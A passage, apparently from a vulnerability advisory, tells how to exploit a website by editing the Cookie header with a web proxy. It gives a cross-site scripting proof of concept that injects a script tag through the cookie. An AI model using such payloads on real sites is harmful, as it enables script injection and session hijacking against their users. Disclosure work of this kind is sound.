vulnerable Website using a Web Proxy (WebScarab for example or just
Tamper Data Firefox Add-on) then and modify The Cookie variable

Host: localhost.com
Connection: keep-alive

3- Cross Site Scripting (Medium) :

The same thing with the Xss Vulnerability, all you have is to modify
the HTTP request .

Connection: keep-alive
Cookie: </div><script>alert('Xssed-By-Yassin');</script>
